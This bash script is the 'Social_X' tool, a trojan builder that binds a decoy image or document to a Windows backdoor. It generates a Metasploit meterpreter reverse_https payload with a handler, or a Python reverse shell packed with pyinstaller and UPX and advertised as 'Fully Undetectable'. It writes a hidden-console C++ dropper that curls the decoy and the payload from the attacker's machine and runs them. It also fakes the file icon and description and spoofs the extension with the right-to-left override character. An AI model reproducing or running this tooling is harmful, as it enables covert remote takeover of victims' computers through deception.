lightblue=`tput setaf 14` 
green=`tput setaf 46`     
RED=`tput setaf 196`      
yellow=`tput setaf 11`    
purple=`tput setaf 129`   
reset=`tput sgr0` 
clear
if [ $(whoami) != "root" ];then
        echo -e "${RED}Please run this script with root privilages."
        echo -e "\n${lightblue}sudo bash setup.sh"
        exit
fi
sudo rm CppCodes/* &> /dev/null
sudo rm SOCIALX_BACKDOOR/*.exe &> /dev/null
sudo rm wsgi_sw/Upload_Server/images/* &>/dev/null
sudo killall -9 xterm 
checK=$(sudo lsof -i :80)
if [[ $checK != "" ]];then
    kill=$(sudo lsof -i :80 | awk '{print $1}' | cut -d "D" -f 2)
    echo -e "${RED}[!]${purple} Port Number 80 is Already IN USE!!\n"
    read -p "${blue}[?]${green} Would you like me to kill the related port number?[y/n]" sor
    if [[ $sor == "y" ]] || [[ $sor == "Y" ]] || [[ $sor == "yes" ]];then
        sudo killall -9 $kill
    fi
fi
xterm -hold -e "echo -e 'Input Your Root Password\n~Social_X~' && sudo python3 wsgi_sw/Upload_Server/app.py" &> /dev/null &
function banner(){
    echo ${green}
    figlet Social_X -f banner/larry3d.flf 
    echo ${green} ------------------------------------------------------------------
    echo -e "                         By:Aziz Kaplan" 
    echo -e "                          Version:2.0" 
    echo ${green} ------------------------------------------------------------------
}


function binder() {
    clear
    banner
    echo ${RED}
    echo ${lightblue}
    echo -e "${green}[+]${lightblue}Enter The File Path That You Want To Embed(it could be jpg,docx,png etc.)"
    echo -e "\n"
    read -p  "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" file_path
    sudo cp $file_path wsgi_sw/Upload_Server/images/
    file=$(basename $file_path)
    IN="$file"
    set -- "$IN"
    ext_spoof=$(echo $file | cut -d "." -f 2 | rev)
    clear
    banner
    echo "${purple}[+]${green} Have You Created A Backdoor?(Y/N or yes/no)"
    echo -e "\n"
    read  -p "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" ask

    if [[ $ask == "y" || $ask == "yes" || $ask == "YES" || $ask == "Y" ]]
        then
            clear
            banner
            echo "${green}[+]${lightblue}Path Of The Main(Will Be Executed) File:"
            echo -e "\n"
            read -p "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" exe_path
            exe_file=$(basename $exe_path)
            echo ${lightblue}
            sudo cp $exe_path wsgi_sw/Upload_Server/images/

    elif [[ $ask == "n" || $ask == "no" || $ask == "NO"  || $ask == "N" ]] ;then
        clear
        banner
        echo -e "${green}[+]${lightblue}Enter The File Name That You Want To Run[Input The Name With Extension]\n"
        read -p "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" exe_file
        clear
        banner
        checker=$(curl http://$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')/$file -s | grep 404) 
        if [[ $checker = "<title>404 Not Found</title>"  ]];then 
            echo "${green}[+]This Name Is Available For File $file"
        else
            echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $file"
            exit
        fi
            checker1=$(curl http://$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')/$exe_file -s | grep 404)
        if [[ $checker1 = "<title>404 Not Found</title>"  ]];then 
            echo "${green}[+]This Name Is Available:$exe_file"
            clear
            banner
            echo -e "${green} [#]${lightblue}Choose A Backdoor Option:"
            echo -e "${green} |1|->${lightblue}Reverse Shell([Fully Undetectable])\n"
            echo -e "${green} |2|->${lightblue}Metasploit Exe Trojan(NOT FUD-IT IS DETECTABLE)"
            read -p "${purple}${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" backdoor_option
            
            if [[ $backdoor_option = "2" ]];then
				exe_file="Search.exe"
                clear
                banner
                private_ip=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
                read -p "${green}[+]${lightblue}LHOST[Default:$private_ip]-->" ip
                read -p "${green}[+]${lightblue}LPORT-->" port
                

                if [[ $ip = "" ]];then
                    cd SOCIALX_BACKDOOR/ 
                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$private_ip LPORT=$port -f exe > $exe_file
                    cd ../
                    echo use exploit/multi/handler > Metasploit/socialx.rc
                    echo set LHOST $private_ip >> Metasploit/socialx.rc
                    echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/socialx.rc
                    echo set LPORT $port >> Metasploit/socialx.rc
                    echo exploit -j -z >> Metasploit/socialx.rc
                else
                    cd SOCIALX_BACKDOOR/ 
                    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > $exe_file
                    cd ../
                    echo use exploit/multi/handler > Metasploit/socialx.rc
                    echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/socialx.rc
                    echo set LHOST $ip >> Metasploit/socialx.rc
                    echo set LPORT $port >> Metasploit/socialx.rc
                    echo exploit -j -z >> Metasploit/socialx.rc
                fi
                
                echo msfconsole -r Metasploit/socialx.rc > socialx_backdoor.sh
                chmod 755 socialx_backdoor.sh
                xterm -hold -e ./socialx_backdoor.sh &
                clear
                banner
                sudo mv SOCIALX_BACKDOOR/*.exe WSGI_Server/Upload_Server/images/Search.exe
              
                
        
            elif [[ $backdoor_option = "1"  ]];then
                exe_file="Search.exe"
                clear
                banner
                read -p "${green}[+]${lightblue} LHOST/RHOST[default:$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')]:" host
                if [[ $host == "" ]];then
                    ipAddr=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
                else
                    ipAddr=$host
                fi

                read -p "${green}[+]${lightblue} PORT[default:4444]" port
                if [[ $host == "" ]];then
                    porT=4444
                else
                    porT=$port
                fi
                echo "f='$ipAddr'" > reverseShell/ipPort.py
                echo "f1=$porT" >> reverseShell/ipPort.py
                sleep 5
                cd reverseShell/ && wine $HOME'/.wine/drive_c/users/'$(whoami)'/Local Settings/Application Data/Programs/Python/Python36-32/Scripts/pyinstaller.exe' --hidden-import socket,os,subprocess,pyautogui --icon ../banner/icon.ico --onefile --upx-dir upx-3.96-win32/upx.exe -w client.py
                cd ../
        
                cp reverseShell/dist/client.exe SOCIALX_BACKDOOR/
                rm -r reverseShell/*.spec reverseShell/__pycache__ reverseShell/build/ reverseShell/dist/
                mv SOCIALX_BACKDOOR/client.exe SOCIALX_BACKDOOR/$exe_file
                sudo cp SOCIALX_BACKDOOR/$exe_file WSGI_Server/Upload_Server/images/
                sudo cp $file_path WSGI_Server/Upload_Server/images/
                
                clear
                banner
                xterm -hold -e "cd reverseShell/ && python3 server.py" &> /dev/null &
            fi
        else
                echo "${red}[-]Please Choose Another Name.This Name IS Already IN The Server $exe_file"
                exit
        fi
        
    fi
    Cpp
    clear
    banner
    echo -e ${yellow}"\n[+]Dev-C++ Will Be Started. Compile the .cpp file\n"
    echo  -e "\n${RED}[!]${lightblue}PLEASE CONVERT THE FILE IN 'Social_X/CppCodes/' FOLDER OTHERWISE TOOL WILL NOT WORK PROPERLY!"
    sleep 4
    wine $HOME'/.wine/drive_c/Program Files (x86)/Dev-Cpp/devcpp.exe'
    clear
    banner
    echo -e "${green}[+]${lightblue}Enter a file description to the malicious file:\n "
    read -p  "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" desc
    clear 
    banner
    echo -e "${green}[+]${lightblue}Enter the path of icon file:\n"
    read -p  "${lightblue}Social_X${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" icon
    clear
    banner
    mv CppCodes/*.exe CppCodes/lif$ext_spoof.exe
    cd CppCodes/
    sudo wine64 ../RCedit/rcedit-x64.exe lif$ext_spoof.exe --set-version-string FileDescription $desc --set-icon $icon &> /dev/null
    sudo cp lif$ext_spoof.exe ../WSGI_Server/Upload_Server/images/
    look_zip=$(ls -l | awk {'print $9'} | cut -d "." -f 2)
    left2right
    cd ../
    clear
    banner
}
function Cpp() {
    ip=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
    CppCode='#include <iostream>'
    CppCode1='#include <unistd.h>'
    CppCode2='#include <windows.h>'
    CppCode3='using namespace std;'
    CppCode4='int WINAPI WinMain(HINSTANCE inst,HINSTANCE prev,LPSTR cmd,int show){'
    CppCode5='ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);'
    CppCode6='system("cmd /c curl http://'$ip'/images/'$file' -o %homepath%/AppData/Local/Temp/'$file'");'
    CppCode7='system("cmd /c curl http://'$ip'/images/'$exe_file' -o %homepath%/AppData/Local/Temp/'$exe_file'");'
    CppCode8='usleep(3000);'
    CppCode9='system("cmd /c start %homepath%/AppData/Local/Temp/'$file'");'
    CppCode10='usleep(3000);'
    CppCode11='system("cmd /c curl http://'$ip'/images/'$exe_file' -o %homepath%/AppData/Local/Temp/'$exe_file'");'
    CppCode12='system("powershell %homepath%/AppData/Local/Temp/'$exe_file'");'
    CppCode13='FreeConsole();'
    CppCode14='return 0;'
    CppCode15='}'
    
    echo $CppCode > CppCodes/socialx.cpp
    echo $CppCode1 >> CppCodes/socialx.cpp
    echo $CppCode2 >> CppCodes/socialx.cpp
    echo $CppCode3 >> CppCodes/socialx.cpp
    echo $CppCode4 >> CppCodes/socialx.cpp
    echo $CppCode5 >> CppCodes/socialx.cpp
    echo $CppCode6 >> CppCodes/socialx.cpp
    echo $CppCode7 >> CppCodes/socialx.cpp
    echo $CppCode8 >> CppCodes/socialx.cpp
    echo $CppCode9 >> CppCodes/socialx.cpp
    echo $CppCode10 >> CppCodes/socialx.cpp
    echo $CppCode11 >> CppCodes/socialx.cpp
    echo $CppCode12 >> CppCodes/socialx.cpp
    echo $CppCode13 >> CppCodes/socialx.cpp
    echo $CppCode14 >> CppCodes/socialx.cpp
    echo $CppCode15 >> CppCodes/socialx.cpp
    
}
function left2right() {
    echo "${green}[+]${lightblue}Chromium Will Be Opened.Please Click To ${RED}COPY ${lightblue} Button."
    chromium http://unicode.flopp.net/c/202E /dev/null 2> /dev/null 
}

binder
echo -e "${lightblue}[+]${green} Thanks for using Social_X :) <3"
echo -e "${lightblue}[+]${green} https://github.com/AzizKpln"
echo -e "${lightblue}[+]${green} Youtube:Aziz Kaplan"

    
